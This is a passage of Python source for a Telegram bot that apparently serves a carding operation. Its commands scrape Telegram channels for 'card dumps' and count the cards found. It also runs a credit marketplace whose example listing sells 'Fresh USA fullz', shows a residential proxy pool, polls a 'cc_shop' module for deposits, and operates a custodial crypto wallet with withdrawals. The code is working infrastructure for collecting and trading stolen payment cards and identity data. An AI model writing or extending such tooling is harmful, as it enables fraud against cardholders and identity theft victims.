        ok = add_channel(channel, added_by=admin_id)
        await update.message.reply_text(f"✅ Channel @{channel} added." if ok else f"❌ Could not add @{channel}.", parse_mode=ParseMode.HTML)

    elif sub == "remove":
        if len(context.args) < 2:
            await update.message.reply_text(
                "📡 <b>Remove Scraper Channel</b>\n\n"
                "<b>Usage:</b> <code>/scraper remove @channel</code>\n\n"
                "<b>Example:</b> <code>/scraper remove @cardingchannel</code>",
                parse_mode=ParseMode.HTML,
            )
            return
        channel = context.args[1].lstrip("@")
        ok = remove_channel(channel)
        await update.message.reply_text(f"✅ Channel @{channel} removed." if ok else f"❌ Not found.", parse_mode=ParseMode.HTML)

    elif sub == "list":
        channels = get_active_channels()
        if not channels:
            await update.message.reply_text("No channels in scraper.", parse_mode=ParseMode.HTML)
            return
        lines = [f"• @{c}" if isinstance(c, str) else f"• @{c.get('channel', '?')}" for c in channels]
        await update.message.reply_text(ae("📡 <b>Scraper Channels</b>") + "\n\n" + "\n".join(lines), parse_mode=ParseMode.HTML)

    elif sub == "stats":
        stats_list = get_scraper_stats()
        cards = sum(s.get('found', 0) for s in stats_list) if stats_list else 0
        active_count = sum(1 for s in stats_list if s.get('active')) if stats_list else 0
        per_channel = "\n".join(
            f"  • @{s.get('channel','?')}: {s.get('found',0)} cards {'✅' if s.get('active') else '❌'}"
            for s in (stats_list or [])[:8]
        ) or "  No channels"
        await update.message.reply_text(
            ae("📊 <b>Scraper Stats</b>") + "\n\n"
            f"📡 Active channels: <b>{active_count}</b>\n"
            f"💳 Total cards found: <b>{cards}</b>\n\n"
            f"{per_channel}",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(
            "📡 <b>Channel Card Scraper</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/scraper add @channel</code>\n"
            "<code>/scraper remove @channel</code>\n"
            "<code>/scraper list</code>\n"
            "<code>/scraper stats</code>\n\n"
            "<b>Subcommands:</b>\n"
            "• <code>add</code> — Monitor a channel for card dumps\n"
            "• <code>remove</code> — Stop monitoring a channel\n"
            "• <code>list</code> — Show all monitored channels\n"
            "• <code>stats</code> — Cards found per channel\n\n"
            "<b>Example:</b>\n"
            "<code>/scraper add @cardingchannel</code>\n\n"
            "⚠️ Bot must be admin in the channel.\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )


async def cmd_marketplace(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show marketplace info (/marketplace)."""
    await update.message.reply_text(
        ae("🛍 <b>Marketplace</b>") + "\n\n"
        "List and browse items for sale using credits.\n\n"
        "<b>Commands:</b>\n"
        "/market list — Browse listings\n"
        "/market sell &lt;price&gt; &lt;item&gt; — Create listing\n"
        "/market buy &lt;listing_id&gt; — Purchase item\n"
        "/market mylistings — Your active listings",
        parse_mode=ParseMode.HTML,
    )


async def cmd_market(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Marketplace: list/sell/buy/mylistings (/market <sub> ...)."""
    user_id = update.effective_user.id
    sub = context.args[0].lower() if context.args else "list"

    er = _mdb()
    _ensure_marketplace_table()
    import uuid as _uuid

    if sub == "sell":
        if len(context.args) < 3:
            await update.message.reply_text(
                "🏷 <b>Create Marketplace Listing</b>\n\n"
                "<b>Usage:</b>\n"
                "<code>/market sell &lt;price_credits&gt; &lt;description&gt;</code>\n\n"
                "<b>Arguments:</b>\n"
                "• <code>price_credits</code> — How many credits to charge\n"
                "• <code>description</code> — What you're selling\n\n"
                "<b>Example:</b>\n"
                "<code>/market sell 200 Fresh USA fullz x10</code>",
                parse_mode=ParseMode.HTML,
            )
            return
        try:
            price = int(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Price must be a number.", parse_mode=ParseMode.HTML)
            return
        item_desc = " ".join(context.args[2:])
        listing_id = _uuid.uuid4().hex[:8].upper()
        er(
            "INSERT INTO marketplace_listings(listing_id, seller_id, price, description, status) VALUES(%s,%s,%s,%s,'active')",
            (listing_id, user_id, price, item_desc),
        )
        await update.message.reply_text(
            ae("🏷 <b>Listing Created</b>") + "\n\n"
            f"📋 Item: {html_escape(item_desc)}\n"
            f"💰 Price: <b>{price}</b> credits\n"
            f"🆔 Listing ID: <code>{listing_id}</code>",
            parse_mode=ParseMode.HTML,
        )

    elif sub == "list":
        rows = er("SELECT listing_id, seller_id, price, description FROM marketplace_listings WHERE status='active' LIMIT 20", fetch=True)
        if not rows:
            await update.message.reply_text("No active listings.", parse_mode=ParseMode.HTML)
            return
        lines = [f"• <code>{r[0]}</code> — {str(r[3])[:40]} | {r[2]} cr (by <code>{r[1]}</code>)" for r in (rows or [])]
        await update.message.reply_text(ae("🛍 <b>Marketplace Listings</b>") + "\n\n" + "\n".join(lines), parse_mode=ParseMode.HTML)

    elif sub == "buy":
        if len(context.args) < 2:
            await update.message.reply_text(
                "🛍 <b>Buy Listing</b>\n\n"
                "<b>Usage:</b> <code>/market buy &lt;listing_id&gt;</code>\n\n"
                "<b>Arguments:</b>\n"
                "• <code>listing_id</code> — The 8-character code from the listing\n\n"
                "<b>Example:</b> <code>/market buy A1B2C3D4</code>\n\n"
                "💡 Use <code>/market list</code> to see available listings.",
                parse_mode=ParseMode.HTML,
            )
            return
        listing_id = context.args[1].upper()
        row = er("SELECT seller_id, price, description FROM marketplace_listings WHERE listing_id=%s AND status='active'", (listing_id,), fetch=True, fetch_one=True)
        if not row:
            await update.message.reply_text("❌ Listing not found or sold.", parse_mode=ParseMode.HTML)
            return
        seller_id, price, desc = row
        if seller_id == user_id:
            await update.message.reply_text("❌ Cannot buy your own listing.", parse_mode=ParseMode.HTML)
            return
        bal = get_balance(user_id)
        if bal < price:
            await update.message.reply_text(f"❌ Insufficient credits. You have {bal}, need {price}.", parse_mode=ParseMode.HTML)
            return
        ok, msg_txt = transfer_credits(user_id, seller_id, price)
        if ok:
            er("UPDATE marketplace_listings SET status='sold', buyer_id=%s WHERE listing_id=%s", (user_id, listing_id))
            await update.message.reply_text(
                ae("✅ <b>Purchase Successful!</b>") + "\n\n"
                f"📋 Item: {html_escape(str(desc))}\n"
                f"💰 Paid: {price} credits",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(f"❌ Purchase failed: {msg_txt}", parse_mode=ParseMode.HTML)

    elif sub == "mylistings":
        rows = er("SELECT listing_id, price, description, status FROM marketplace_listings WHERE seller_id=%s LIMIT 10", (user_id,), fetch=True)
        if not rows:
            await update.message.reply_text("You have no listings.", parse_mode=ParseMode.HTML)
            return
        lines = [f"• <code>{r[0]}</code> — {str(r[2])[:35]} | {r[1]} cr | {r[3]}" for r in (rows or [])]
        await update.message.reply_text(ae("📦 <b>My Listings</b>") + "\n\n" + "\n".join(lines), parse_mode=ParseMode.HTML)

    else:
        await update.message.reply_text(
            "🛒 <b>Marketplace</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/market list</code>  ← browse all listings\n"
            "<code>/market sell &lt;price&gt; &lt;description&gt;</code>  ← create listing\n"
            "<code>/market buy &lt;listing_id&gt;</code>  ← purchase a listing\n"
            "<code>/market mylistings</code>  ← your active listings\n\n"
            "<b>Example:</b>\n"
            "<code>/market sell 200 Fresh USA fullz x10</code>\n"
            "<code>/market buy A1B2C3D4</code>",
            parse_mode=ParseMode.HTML,
        )


async def cmd_geterror(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send the error log file to the owner (/geterror)."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return

    import io, datetime

    log_path = ERROR_LOG_FILE
    subcommand = (context.args[0].lower() if context.args else "").strip()

    # /geterror clear — wipe the log
    if subcommand == "clear":
        try:
            open(log_path, "w").close()
            await update.message.reply_text("🗑 <b>Error log cleared.</b>", parse_mode=ParseMode.HTML)
        except Exception as e:
            await update.message.reply_text(f"❌ Could not clear log: {e}")
        return

    # Read log file
    try:
        with open(log_path, "r", encoding="utf-8", errors="replace") as f:
            content = f.read()
    except FileNotFoundError:
        await update.message.reply_text(
            "📭 <b>No errors logged yet.</b>\n\nThe error log is empty — great sign! 🎉",
            parse_mode=ParseMode.HTML,
        )
        return
    except Exception as e:
        await update.message.reply_text(f"❌ Could not read log: {e}")
        return

    if not content.strip():
        await update.message.reply_text(
            "📭 <b>Error log is empty.</b>\n\nNo errors recorded since last clear. 🎉",
            parse_mode=ParseMode.HTML,
        )
        return

    # Keep only the last 500 lines to stay within Telegram's 50 MB document limit
    lines = content.splitlines()
    total_lines = len(lines)
    MAX_LINES = 500
    if total_lines > MAX_LINES:
        lines = lines[-MAX_LINES:]
        truncated = True
    else:
        truncated = False

    output = "\n".join(lines)
    now = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"bot_errors_{now}.txt"

    header = (
        f"📋 Error Log — {now}\n"
        f"Total lines: {total_lines}"
        + (f" (showing last {MAX_LINES})" if truncated else "")
        + "\n" + "=" * 60 + "\n\n"
    )
    file_bytes = (header + output).encode("utf-8")

    caption = (
        f"📋 <b>Error Log</b>\n"
        f"Lines: <code>{total_lines}</code>"
        + (f" (last {MAX_LINES} shown)" if truncated else "")
        + f"\nSize: <code>{len(file_bytes) // 1024} KB</code>\n\n"
        f"<i>Use</i> <code>/geterror clear</code> <i>to wipe the log.</i>"
    )

    await update.message.reply_document(
        document=io.BytesIO(file_bytes),
        filename=filename,
        caption=caption,
        parse_mode=ParseMode.HTML,
    )


async def cmd_proxy_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show residential proxy pool info (/proxyinfo)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    proxy = get_random_proxy()
    if proxy:
        await update.message.reply_text(
            ae("🌐 <b>Residential Proxy Pool</b>") + "\n\n"
            f"✅ Pool active\n"
            f"🔁 Sample proxy: <code>{proxy.split('@')[-1] if '@' in proxy else proxy}</code>",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(
            ae("🌐 <b>Residential Proxy Pool</b>") + "\n\n"
            "❌ No residential proxies available.\n"
            "Add proxies via the admin panel or /addproxy command.",
            parse_mode=ParseMode.HTML,
        )


def _deposit_checker_loop():
    import time as _time
    while True:
        try:
            _time.sleep(120)
            from modules.cc_shop import check_pending_deposits
            confirmed = check_pending_deposits()
            if confirmed > 0:
                print(f"[Deposit Checker] Confirmed {confirmed} deposit(s)")
        except Exception as e:
            print(f"[Deposit Checker] Error: {e}")


# ════════════════════════════════════════════════════════════════════════
# CUSTODIAL WALLET BOT COMMANDS
# ════════════════════════════════════════════════════════════════════════
_WALLET_OWNER_UID = 1857417752


async def cmd_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/wallet — show internal balances + open web wallet."""
    user = update.effective_user
    try:
        from modules.database import _execute_with_retry
        rows = _execute_with_retry(
            "SELECT asset, balance FROM wallet_balances WHERE telegram_id = %s ORDER BY asset",
            (user.id,), fetch=True
        ) or []
    except Exception:
        rows = []
    lines = ["💰 <b>Your Wallet</b>", "━━━━━━━━━━━━━━━━━━"]
    if rows:
        for r in rows:
            bal = float(r['balance'] or 0)
            if bal > 0:
                lines.append(f"  • <b>{r['asset']}</b>: <code>{bal:.8f}</code>".rstrip('0').rstrip('.'))
        if len(lines) == 2:
            lines.append("  No balance yet — use /deposit to get started.")
    else:
        lines.append("  Empty — use /deposit to add funds.")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append("📲 Open the full web wallet for QR codes, P2P, and history.")
    keyboard = [
        [{"text": "🌐 Open Web Wallet", "url": f"https://t.me/{BOT_USERNAME}?start=wallet"}],
        [{"text": "⬇️ Deposit", "callback_data": "wlt:deposit"},
         {"text": "💸 Send", "callback_data": "wlt:send"}],
        [{"text": "⬆️ Withdraw", "callback_data": "wlt:withdraw"},
         {"text": "📜 History", "callback_data": "wlt:history"}],
    ]
    from telegram import InlineKeyboardMarkup, InlineKeyboardButton
    def _mkbtn(b):
        if b.get('url'):
            return InlineKeyboardButton(b['text'], url=b['url'])
        return InlineKeyboardButton(b['text'], callback_data=b.get('callback_data', 'noop'))
    kb = InlineKeyboardMarkup([[_mkbtn(b) for b in row] for row in keyboard])
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=kb)


async def cmd_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/deposit [chain] — show HD-derived deposit address."""
    user = update.effective_user
    chain = (context.args[0].lower() if context.args else "").strip()
    try:
        from modules.hd_wallet import get_or_create_addresses, is_available
        if not is_available():
            await update.message.reply_text(
                "⚠️ HD wallet not configured. Owner must set MASTER_WALLET_MNEMONIC.",
                parse_mode=ParseMode.HTML)
            return
        addrs = get_or_create_addresses(user.id) or {}
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        return
    if not addrs:
        await update.message.reply_text("❌ Could not generate deposit addresses.")
        return
    if chain and chain in addrs:
        text = (f"⬇️ <b>Deposit {chain.title()}</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"<code>{addrs[chain]}</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⚠️ Only send {chain.title()} network assets!")
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
        return
    lines = ["⬇️ <b>Your Deposit Addresses</b>", "━━━━━━━━━━━━━━━━━━"]
    for ch in ["ethereum", "bsc", "polygon", "tron", "solana", "ton", "bitcoin"]:
        if ch in addrs:
            lines.append(f"<b>{ch.title()}:</b>\n<code>{addrs[ch]}</code>\n")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append("💡 Use <code>/deposit &lt;chain&gt;</code> for one-tap copy.")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def cmd_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/send <@user|id> <amount> <asset> [note]"""
    user = update.effective_user
    if len(context.args) < 3:
        await update.message.reply_text(
            "Usage: <code>/send &lt;@user|id&gt; &lt;amount&gt; &lt;ASSET&gt; [note]</code>\n"
            "Example: <code>/send @alice 0.5 ETH coffee</code>",
            parse_mode=ParseMode.HTML)
        return
    recipient_q = context.args[0]
    try:
        amount = float(context.args[1])
        if amount <= 0:
            raise ValueError()
    except Exception:
        await update.message.reply_text("❌ Invalid amount")
        return
    asset = context.args[2].upper()
    note = " ".join(context.args[3:])[:200]

    # Resolve recipient
    try:
        from modules.database import _execute_with_retry
        q = recipient_q.lstrip("@").strip()
        if q.isdigit():
            rec = _execute_with_retry(
                "SELECT user_id, username FROM users WHERE user_id = %s",
                (int(q),), fetch_one=True)
        else:
            rec = _execute_with_retry(
                "SELECT user_id, username FROM users WHERE LOWER(username) = LOWER(%s)",
                (q,), fetch_one=True)
        if not rec:
            await update.message.reply_text(f"❌ Recipient '{recipient_q}' not found. They must use the bot first.")
            return
        rec_id = int(rec['user_id'])
        if rec_id == user.id:
            await update.message.reply_text("❌ Cannot send to yourself")
            return

        # Atomic debit + credit + log inside one DB transaction
        from keep_alive import _wallet_txn
        insufficient = False
        with _wallet_txn() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    """UPDATE wallet_balances SET balance = balance - %s, updated_at = NOW()
                        WHERE telegram_id = %s AND asset = %s AND balance >= %s
                        RETURNING balance""",
                    (str(amount), user.id, asset, str(amount))
                )
                if cur.fetchone() is None:
                    insufficient = True
                    raise RuntimeError("INSUFFICIENT")
                cur.execute(
                    """INSERT INTO wallet_balances (telegram_id, asset, balance, updated_at)
                       VALUES (%s, %s, %s, NOW())
                       ON CONFLICT (telegram_id, asset) DO UPDATE
                         SET balance = wallet_balances.balance + EXCLUDED.balance, updated_at = NOW()""",
                    (rec_id, asset, str(amount))
                )
                cur.execute(
                    """INSERT INTO wallet_transactions (telegram_id, counterparty_id, tx_type, asset, amount, status, note)
                       VALUES (%s, %s, 'transfer_out', %s, %s, 'confirmed', %s)""",
                    (user.id, rec_id, asset, str(amount), note)
                )
                cur.execute(
                    """INSERT INTO wallet_transactions (telegram_id, counterparty_id, tx_type, asset, amount, status, note)
                       VALUES (%s, %s, 'transfer_in', %s, %s, 'confirmed', %s)""",
                    (rec_id, user.id, asset, str(amount), note)
                )
    except RuntimeError as e:
        if str(e) == "INSUFFICIENT" or insufficient:
            await update.message.reply_text(f"❌ Insufficient {asset} balance")
            return
        await update.message.reply_text(f"❌ Transfer failed: {e}")
        return
    except Exception as e:
        await update.message.reply_text(f"❌ Transfer failed: {e}")
        return

    rec_label = f"@{rec['username']}" if rec.get('username') else f"User #{rec_id}"
    sender_label = f"@{user.username}" if user.username else f"User #{user.id}"
    await update.message.reply_text(
        f"✅ <b>Sent {amount} {asset}</b> to {rec_label}"
        + (f"\n📝 {note}" if note else ""),
        parse_mode=ParseMode.HTML)
    # Notify recipient
    try:
        await context.bot.send_message(
            chat_id=rec_id,
            text=(f"💰 <b>Crypto Received!</b>\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"💎 <b>{amount} {asset}</b>\n"
                  f"👤 From: {sender_label}"
                  + (f"\n📝 {note}" if note else "")),
            parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cmd_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/withdraw <amount> <ASSET> <recipient> [chain]

    `recipient` may be @username, a numeric Telegram id, or a wallet address.
    `chain` is only needed to disambiguate EVM addresses (ethereum/bsc/polygon/…).
    """
    user = update.effective_user
    if len(context.args) < 3:
        await update.message.reply_text(
            "Usage: <code>/withdraw &lt;amount&gt; &lt;ASSET&gt; &lt;recipient&gt; [chain]</code>\n\n"
            "Examples:\n"
            "• <code>/withdraw 5 USDT_TRC20 TXYZ…abc</code>\n"
            "• <code>/withdraw 0.1 ETH 0xabc… ethereum</code>\n"
            "• <code>/withdraw 10 USDT_TRC20 @alice</code> (instant internal)\n\n"
            "Or use the web wallet for a friendlier interface.",
            parse_mode=ParseMode.HTML)
        return
    try:
        amount = float(context.args[0])
        if amount <= 0:
            raise ValueError()
    except Exception:
        await update.message.reply_text("❌ Invalid amount")
        return
    asset = context.args[1].upper()
    raw_recipient = context.args[2].strip()
    chain_hint = (context.args[3].lower() if len(context.args) >= 4 else None)

    try:
        from modules.chain_config import (
            parse_recipient, chain_label, explorer_addr_url,
            chain_supports_asset, asset_compatible_chains,
        )
        from keep_alive import (
            _wallet_txn, _resolve_recipient, _credit_balance,
            _debit_balance, _log_wallet_tx,
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Wallet module error: {e}")
        return

    parsed = parse_recipient(raw_recipient, asset=asset, chain_hint=chain_hint)
    if parsed.get('error'):
        await update.message.reply_text(f"❌ {parsed['error']}")
        return
    kind = parsed.get('kind')

    # ── Internal transfer ──────────────────────────────────────────────
    if kind in ('tg_id', 'tg_username'):
        rec_q = ('@' + parsed['username']) if kind == 'tg_username' else str(parsed['telegram_id'])
        rec = _resolve_recipient(rec_q)
        if not rec:
            await update.message.reply_text(
                f"❌ Recipient {rec_q} not found. They must use the bot at least once.")
            return
        rec_id = int(rec['user_id'])
        if rec_id == user.id:
            await update.message.reply_text("❌ Cannot send to yourself")
            return
        try:
            with _wallet_txn() as conn:
                if not _debit_balance(user.id, asset, amount, conn=conn):
                    await update.message.reply_text(f"❌ Insufficient {asset} balance")
                    return
                _credit_balance(rec_id, asset, amount, conn=conn)
                _log_wallet_tx(conn=conn, telegram_id=user.id, counterparty_id=rec_id,
                               tx_type='transfer_out', asset=asset, amount=amount,
                               status='confirmed')
                _log_wallet_tx(conn=conn, telegram_id=rec_id, counterparty_id=user.id,
                               tx_type='transfer_in', asset=asset, amount=amount,
                               status='confirmed')
        except Exception as e:
            await update.message.reply_text(f"❌ Transfer failed: {e}")
            return
        rec_label = f"@{rec.get('username')}" if rec.get('username') else f"#{rec_id}"
        await update.message.reply_text(
            f"✅ Sent <b>{amount} {asset}</b> to {rec_label} (instant, internal).",
            parse_mode=ParseMode.HTML)
        try:
            sender_label = f"@{user.username}" if user.username else f"User #{user.id}"
            await context.bot.send_message(
                chat_id=rec_id,
                text=(f"💰 <b>Crypto Received!</b>\n"
                      f"━━━━━━━━━━━━━━━━━━\n"
                      f"💎 {amount} {asset}\n"
                      f"👤 From: {sender_label}"),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return

    # ── On-chain withdrawal ────────────────────────────────────────────
    if kind != 'address':
        await update.message.reply_text("❌ Could not interpret recipient.")
        return

    chain = parsed.get('chain')
    candidates = parsed.get('candidates') or []
    address = parsed['address']
    if not chain:
        # Ambiguous EVM address — let the user pick the network inline.
        # Stash the pending request in user_data so callback_data stays small.
        import secrets as _secrets
        short_id = _secrets.token_urlsafe(6)
        if not hasattr(context, 'user_data') or context.user_data is None:
            # context.user_data is provided by PTB; this guard is for safety.
            pending_store = {}
        else:
            pending_store = context.user_data.setdefault('_wd_pending', {})
        pending_store[short_id] = {
            'amount': amount, 'asset': asset, 'address': address,
        }
        # Filter candidates to those that actually support this asset.
        viable = [c for c in candidates if chain_supports_asset(c, asset)]
        if not viable:
            compat = asset_compatible_chains(asset)
            await update.message.reply_text(
                f"❌ {asset} cannot be sent to that address.\n"
                f"Compatible networks: {', '.join(compat) if compat else '(none)'}")
            return
        from telegram import InlineKeyboardButton, InlineKeyboardMarkup
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(chain_label(c), callback_data=f"wdpick:{short_id}:{c}")]
            for c in viable
        ])
        await update.message.reply_text(
            f"❓ <b>Which network?</b>\n"
            f"This address is valid on multiple chains.\n"
            f"💎 {amount} {asset} → <code>{address[:18]}…</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb)
        return
    if not chain_supports_asset(chain, asset):
        compat = asset_compatible_chains(asset)
        await update.message.reply_text(
            f"❌ {asset} cannot be withdrawn on {chain_label(chain)}.\n"
            f"Compatible: {', '.join(compat) if compat else '(none)'}")
        return

    try:
        wid = None
        with _wallet_txn() as conn:
            if not _debit_balance(user.id, asset, amount, conn=conn):
                await update.message.reply_text(f"❌ Insufficient {asset} balance")
                return
            wid = _log_wallet_tx(
                conn=conn, telegram_id=user.id, tx_type='withdraw',
                chain=chain, asset=asset, amount=amount,
                address=address, status='pending',
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Withdrawal failed: {e}")
        return

    short = f"{address[:10]}…{address[-6:]}" if len(address) > 22 else address
    addr_url = explorer_addr_url(chain, address)
    keyboard = None
    if addr_url:
        from telegram import InlineKeyboardButton, InlineKeyboardMarkup
        keyboard = InlineKeyboardMarkup([[
            InlineKeyboardButton("🔍 View Address on Explorer", url=addr_url)
        ]])
    await update.message.reply_text(
        f"⏳ <b>Withdrawal Queued #{wid}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💎 {amount} {asset}\n"
        f"🔗 {chain_label(chain)}\n"
        f"📤 To: <code>{short}</code>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"⌛ Broadcasting on the next worker tick (≤45s).",
        parse_mode=ParseMode.HTML, reply_markup=keyboard)


async def cmd_confirmwd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner only: /confirmwd <id> <tx_hash>"""
    user = update.effective_user
    if user.id != _WALLET_OWNER_UID:
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /confirmwd <id> <tx_hash>")
        return
    try:
        wid = int(context.args[0])
        tx_hash = context.args[1].strip()
    except Exception:
        await update.message.reply_text("❌ Invalid args")
        return
    try:
        from modules.database import _execute_with_retry
        row = _execute_with_retry(
            """UPDATE wallet_transactions SET tx_hash = %s, status = 'confirmed'
                WHERE id = %s AND tx_type = 'withdraw'
                  AND status IN ('pending', 'broadcasting', 'broadcast', 'needs_reconciliation')
                RETURNING telegram_id, asset, amount, chain, address""",
            (tx_hash, wid), fetch_one=True
        )
        if not row:
            await update.message.reply_text(f"❌ Withdrawal #{wid} not found or already processed")
            return
        await update.message.reply_text(f"✅ Marked #{wid} confirmed (tx: {tx_hash[:14]}…)")
        try:
            from modules.chain_config import explorer_tx_url, chain_label
            tx_url = explorer_tx_url(row['chain'], tx_hash)
            kb = None
            if tx_url:
                from telegram import InlineKeyboardButton, InlineKeyboardMarkup
                kb = InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔍 View Transaction on Explorer", url=tx_url)
                ]])
            await context.bot.send_message(
                chat_id=int(row['telegram_id']),
                text=(f"✅ <b>Withdrawal Sent!</b>\n"
                      f"━━━━━━━━━━━━━━━━━━\n"
                      f"💎 {row['amount']} {row['asset']}\n"
                      f"🔗 {chain_label(row['chain'])}\n"
                      f"🆔 <code>{tx_hash}</code>"),
                parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            pass
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")


async def cmd_rejectwd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner only: /rejectwd <id> [reason]"""
    user = update.effective_user
    if user.id != _WALLET_OWNER_UID:
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /rejectwd <id> [reason]")
        return
    try:
        wid = int(context.args[0])
    except Exception:
        await update.message.reply_text("❌ Invalid id")
        return
    reason = " ".join(context.args[1:]) or "Rejected by admin"
    try:
        from keep_alive import _wallet_txn
        row = None
        with _wallet_txn() as conn:
            with conn.cursor() as cur:
                # NOTE: Reject is only legal for rows that haven't been
                # claimed by the worker yet ('pending'), OR that the worker
                # has explicitly parked for owner triage
                # ('needs_reconciliation' — see indeterminate-broadcast
                # branch in _withdrawal_worker). Once the worker owns the
                # row ('broadcasting') a tx may already be in flight, and
                # once it's accepted by the mempool ('broadcast') a tx_hash
                # exists; refunding either state risks double-credit. The
                # owner must use /confirmwd in those cases.
                cur.execute(
                    """UPDATE wallet_transactions SET status = 'failed', note = %s
                        WHERE id = %s AND tx_type = 'withdraw'
                          AND status IN ('pending', 'needs_reconciliation')
                        RETURNING telegram_id, asset, amount""",
                    (reason, wid)
                )
                row = cur.fetchone()
                if not row:
                    raise RuntimeError("NOT_FOUND")
                cur.execute(
                    """INSERT INTO wallet_balances (telegram_id, asset, balance, updated_at)
                       VALUES (%s, %s, %s, NOW())
                       ON CONFLICT (telegram_id, asset) DO UPDATE
                         SET balance = wallet_balances.balance + EXCLUDED.balance, updated_at = NOW()""",
                    (int(row['telegram_id']), row['asset'], str(row['amount']))
                )
        await update.message.reply_text(f"✅ Withdrawal #{wid} rejected and refunded.")
        try:
            await context.bot.send_message(
                chat_id=int(row['telegram_id']),
                text=(f"❌ <b>Withdrawal Rejected</b>\n"
                      f"━━━━━━━━━━━━━━━━━━\n"
                      f"💎 {row['amount']} {row['asset']} refunded to your wallet.\n"
                      f"📝 Reason: {reason}"),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass
    except RuntimeError as e:
        if str(e) == "NOT_FOUND":
            await update.message.reply_text(f"❌ Withdrawal #{wid} not found or already processed")
            return
        await update.message.reply_text(f"❌ Error: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")


async def wallet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle wlt:*, wdrej:*, and wdpick:* callbacks."""
    q = update.callback_query
    if not q:
        return
    data = q.data or ""
    await q.answer()
    if data.startswith("wlt:"):
        action = data.split(":", 1)[1]
        guides = {
            "deposit": "Use /deposit to see your unique deposit addresses for each network.",
            "send":    "Use /send @user 0.5 ASSET note — instant P2P transfer.",
            "withdraw":"Use <code>/withdraw &lt;amount&gt; &lt;ASSET&gt; &lt;recipient&gt; [chain]</code> — recipient can be @user, a Telegram id, or a wallet address.",
            "history": "Open the web wallet for full transaction history."
        }
        await q.edit_message_text(
            f"💡 <b>{action.title()}</b>\n\n{guides.get(action, '')}",
            parse_mode=ParseMode.HTML)
    elif data.startswith("wdrej:"):
        if q.from_user.id != _WALLET_OWNER_UID:
            await q.answer("Owner only", show_alert=True)
            return
        try:
            wid = int(data.split(":", 1)[1])
            from keep_alive import _wallet_txn
            row = None
            with _wallet_txn() as conn:
                with conn.cursor() as cur:
                    # See cmd_rejectwd: any row past 'pending' may already
                    # have a tx in flight, so we never refund them here.
                    cur.execute(
                        """UPDATE wallet_transactions SET status = 'failed', note = 'Rejected via button'
                            WHERE id = %s AND tx_type = 'withdraw'
                              AND status IN ('pending', 'needs_reconciliation')
                            RETURNING telegram_id, asset, amount""",
                        (wid,)
                    )
                    row = cur.fetchone()
                    if not row:
                        raise RuntimeError("ALREADY_PROCESSED")
                    cur.execute(
                        """INSERT INTO wallet_balances (telegram_id, asset, balance, updated_at)
                           VALUES (%s, %s, %s, NOW())
                           ON CONFLICT (telegram_id, asset) DO UPDATE
                     SET balance = wallet_balances.balance + EXCLUDED.balance, updated_at = NOW()""",
                (int(row['telegram_id']), row['asset'], str(row['amount']))
            )
            await q.edit_message_text(f"❌ Withdrawal #{wid} rejected and refunded.")
            try:
                await context.bot.send_message(
                    chat_id=int(row['telegram_id']),
                    text=(f"❌ <b>Withdrawal Rejected</b>\n"
                          f"💎 {row['amount']} {row['asset']} refunded."),
                    parse_mode=ParseMode.HTML)
            except Exception:
                pass
        except RuntimeError as e:
            if str(e) == "ALREADY_PROCESSED":
                try:
                    await q.edit_message_text("Already processed.")
                except Exception:
                    pass
                return
            await q.answer(f"Error: {e}", show_alert=True)
        except Exception as e:
            await q.answer(f"Error: {e}", show_alert=True)
    elif data.startswith("wdpick:"):
        # User picked a network for an ambiguous EVM address.
        try:
            _, short_id, picked_chain = data.split(":", 2)
        except Exception:
            await q.answer("Bad picker payload", show_alert=True)
            return
        store = (context.user_data or {}).get('_wd_pending', {})
        pend = store.pop(short_id, None)
        if not pend:
            try:
                await q.edit_message_text("⚠️ This picker expired. Re-run /withdraw.")
            except Exception:
                pass
            return
        amount = pend['amount']; asset = pend['asset']; address = pend['address']
        try:
            from modules.chain_config import (
